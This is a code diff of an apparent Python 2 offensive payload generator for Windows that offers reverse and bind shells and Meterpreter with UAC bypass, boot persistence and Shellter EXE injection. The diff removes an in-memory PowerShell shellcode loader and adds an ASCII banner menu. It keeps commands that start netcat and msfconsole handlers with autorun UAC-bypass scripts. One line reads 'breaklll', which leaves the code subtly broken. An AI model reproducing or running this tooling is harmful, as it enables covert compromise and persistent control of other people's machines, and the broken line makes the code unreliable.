@@ -22,7 +22,24 @@ try:
 except OSError:
     pass
 
-SHELLCODE().MENU()
+print t.clear
+print '=' * t.width + t.bold_red
+print " _       ___       ____              __                __".center(t.width)
+print "   | |     / (_)___  / __ \____ ___  __/ /___  ____ _____/ /____".center(t.width)
+print "   | | /| / / / __ \/ /_/ / __ `/ / / / / __ \/ __ `/ __  / ___/".center(t.width)
+print "  | |/ |/ / / / / / ____/ /_/ / /_/ / / /_/ / /_/ / /_/ (__  )".center(t.width)
+print "  |__/|__/_/_/ /_/_/    \__,_/\__, /_/\____/\__,_/\__,_/____/".center(t.width)
+print "   /____/".center(t.width)
+print t.normal + '=' * t.width
+print ('[1] Windows Reverse Shell' + t.bold_green + '(Stageless)' +
+       t.bold_red + ' [Shellter]').center(t.width - 44) + t.normal
+print ('[2] Windows Reverse Meterpreter' + t.bold_green + '(Staged)' + t.bold_red +
+       ' [Shellter, UacBypass, Priv Esc Checks, Persistence]').center(t.width) + t.normal
+print ('[3] Windows Bind Meterpreter' + t.bold_green + '(Staged)' + t.bold_red +
+       ' [Shellter, UacBypass, Priv Esc Checks, Persistence]').center(t.width - 4) + t.normal
+print ('[4] Windows Reverse Meterpreter HTTPS' + t.bold_green + '(Staged)' +
+       t.bold_red + ' [BETA]').center(t.width - 30) + t.normal
+print '=' * t.width
 
 try:
     while True:
@@ -30,7 +47,7 @@ try:
         if menuchoice == '1':
             payloadchoice = SHELLCODE.windows_rev_shell
             payload = 'Windows Reverse Shell'
-            break
+            breaklll
         elif menuchoice == '2':
             payloadchoice = SHELLCODE.windows_met_rev_shell
             payload = 'Windows Meterpreter Reverse Shell'
@@ -78,19 +95,15 @@ try:
         try:
             if menuchoice == '4':
                 porthex = struct.pack('<h', int(portnum))
-                porthex2 = struct.pack('<h', int(portnum) + 1)
             else:
                 porthex = struct.pack('>h', int(portnum))
-                porthex2 = struct.pack('>h', int(portnum) + 1)
         except:
             print t.bold_red + '[*] Error in Port Syntax'
             sys.exit(1)
         if menuchoice == '4':
             shellcode = payloadchoice % (porthex, iphex)
-            shellcode2 = payloadchoice % (porthex2, iphex)
         else:
             shellcode = payloadchoice % (iphex, porthex)
-            shellcode2 = payloadchoice % (iphex, porthex2)
     elif menuchoice == '3':
         bindport = raw_input(
             '\n[*] Press Enter For Default Bind Port(4444)\n[*] Port> ')
@@ -98,12 +111,10 @@ try:
             bindport = 4444
         try:
             bindporthex = struct.pack('>h', int(bindport))
-            bindporthex2 = struct.pack('>h', int(bindport) + 1)
         except:
             print t.bold_red + '[*] Error in IP Syntax'
             sys.exit(1)
         shellcode = payloadchoice % (bindporthex)
-        shellcode2 = payloadchoice % (bindporthex2)
 
     if menuchoice == '2' or menuchoice == '3':
         want_UACBYPASS = raw_input(
@@ -115,43 +126,14 @@ try:
             want_PERSISTENCE = raw_input(
                 t.bold_red + '[*] Persistent Payload on Boot? y/[n]:' + t.normal)
 
-    for byte in shellcode:
-        ez2read_shellcode += '\\x%s' % byte.encode('hex')
-        count = 0
-        newpayloadlayout = ''
-        for char in ez2read_shellcode:
-            count += 1
-            newpayloadlayout += char
-            if count == 4:
-                newpayloadlayout += ','
-                count = 0
-
-    if want_UACBYPASS.lower() == 'y':
-        for byte in shellcode2:
-            ez2read_shellcode2 += '\\x%s' % byte.encode('hex')
-            count = 0
-            newpayloadlayout = ''
-            for char in ez2read_shellcode2:
-                count += 1
-                newpayloadlayout += char
-                if count == 4:
-                    newpayloadlayout += ','
-                    count = 0
-
-    persistencelayout = re.sub(r'\\x', '0x', newpayloadlayout).rstrip(',')
-    persistencesleep = """Start-Sleep -s 60;$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = %s;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));$2 = "-enc ";if([IntPtr]::Size -eq 8){$3 = $env:SystemRoot + "\syswow64\WindowsPowerShell\\v1.0\powershell";iex "& $3 $2 $e"}else{;iex "& powershell $2 $e";}""" % (
-        persistencelayout)
-    persistencenosleep = """$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = %s;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));$2 = "-enc ";if([IntPtr]::Size -eq 8){$3 = $env:SystemRoot + "\syswow64\WindowsPowerShell\\v1.0\powershell";iex "& $3 $2 $e"}else{;iex "& powershell $2 $e";}""" % (
-        persistencelayout)
-
     if want_PERSISTENCE.lower() == 'y':
-        EXTRAS().PERSISTENCE(persistencesleep)
+        ez2read_shellcode = EXTRAS(shellcode).PERSISTENCE()
 
     if want_UACBYPASS.lower() == 'y':
-        EXTRAS().UACBYPASS(persistencenosleep)
+        ez2read_shellcode = EXTRAS(shellcode).UACBYPASS()
 
     if want_ALLCHECKS.lower() == 'y':
-        EXTRAS().ALLCHECKS()
+        ez2read_shellcode = EXTRAS(shellcode).ALLCHECKS()
 
     want_to_payloadinexe = raw_input(
         t.bold_red + '[*] Inject Shellcode Into an EXE (Shellter)? y/[n]: ' + t.normal)
@@ -266,7 +248,7 @@ try:
         os.system('nc -lvp %s' % portnum)
     elif menuchoice == '2':
         if want_UACBYPASS.lower() == 'y':
-            os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LPORT %s;set LHOST 0.0.0.0;set autorunscript multi_console_command -rc uacbypass.rc;set ExitOnSession false;exploit -j;set LPORT %s;set autorunscript multi_console_command -rc uacbypass2.rc;exploit -j\'' % (portnum, int(portnum) + 1))
+            os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LPORT %s;set LHOST 0.0.0.0;set autorunscript multi_console_command -rc uacbypass.rc;set ExitOnSession false;exploit -j;\'' % (portnum, int(portnum) + 1))
         elif want_ALLCHECKS.lower() == 'y':
             os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LPORT %s;set LHOST 0.0.0.0;set autorunscript post/windows/manage/exec_powershell SCRIPT=allchecks.ps1;set ExitOnSession false;exploit -j\'' % portnum)
         elif want_PERSISTENCE.lower() == 'y':
@@ -277,7 +259,7 @@ try:
         bindip = raw_input(
             '\n[*] Target Bind IP Address \n[*] IP> ')
         if want_UACBYPASS.lower() == 'y':
-            os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/bind_tcp;set LPORT %s;set RHOST %s;set autorunscript multi_console_command -rc uacbypass.rc;set ExitOnSession false;exploit -j;set LPORT %s;set autorunscript multi_console_command -rc uacbypass2.rc;exploit -j\'' % (bindport, bindip, bindport + 1))
+            os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/bind_tcp;set LPORT %s;set RHOST %s;set autorunscript multi_console_command -rc uacbypass.rc;set ExitOnSession false;exploit -j\'' % (bindport, bindip, bindport + 1))
         elif want_ALLCHECKS.lower() == 'y':
             os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/bind_tcp;set LPORT %s;set RHOST %s;set autorunscript post/windows/manage/exec_powershell SCRIPT=allchecks.ps1;set ExitOnSession false;exploit -j\'' % (bindport, bindip))
         elif want_PERSISTENCE.lower() == 'y':
